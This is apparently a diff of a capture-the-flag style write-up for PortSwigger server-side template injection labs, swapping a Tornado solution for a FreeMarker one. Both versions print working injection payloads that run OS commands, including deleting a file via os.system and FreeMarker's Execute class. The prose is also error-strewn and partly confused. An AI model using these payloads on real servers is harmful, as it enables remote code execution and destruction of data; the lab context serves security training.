@@ -1,53 +1,36 @@
-# Lab: Basic server-side template injection (code context)
+# Lab: Server-side template injection using documentation
 
-**Link**: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
+**Link**: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation
 
 **Solution**:
 
-This lab uses Tornodo template which depends on python
+This lab didn’t identity which template are not used.
 
-https://www.tornadoweb.org/en/stable/template.html
+We to identity the template we will try cause error in the code
 
-In account setting, there is preferred name which takes the user.first_name as a variable input like in the docs `like @{var test = 10} in c#`
-
-```bash
-{% for student in [p for p in people if p.student and p.age > 23] %}
-  <li>{{ escape(student.name) }}</li>
-{% end %}
-```
+So if we give it to him undefined name like the following, we will now that the template it used is freemarker based on Java
 
 <p align="center" width="100%">
   <img src="image1.png" width="800" hight="500"/>
 </p>
 
-<p align="center" width="100%">
-  <img src="image2.png" width="800" hight="500"/>
-</p>
+So, based on Java payloads
 
-we will craft a payload to inject OS command
+[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#java](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java)
 
-1- according to the docs
+[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)
 
-its written in the code as ``{{ user.frist_name }}``
+we will use this command as RCE
 
-2- So, image to do another python code, we will close the brackets to be `user.first_name}}`
-
-3- start new python code with {% print(’hello world’) %} to be `user.first_name}}{%import+os%}{os.system('ls')}`
-
-4- to remove the file .txt, so the final payload will be `user.first_name}}{%import+os%}{{os.system('rm+/home/carlos/morale.txt')`
+`<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}`
 
 <p align="center" width="100%">
   <img src="image2.png" width="800" hight="500"/>
 </p>
+to solve the lab we will remove txt file
 
-To Solve the lab, we will change the command to delete file
-
-`<%= system('rm /home/carlos/morale.txt') %>`
+`<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")}.`
 
 <p align="center" width="100%">
   <img src="image3.png" width="800" hight="500"/>
-</p>
-
-<p align="center" width="100%">
-  <img src="image4.png" width="800" hight="500"/>
 </p>
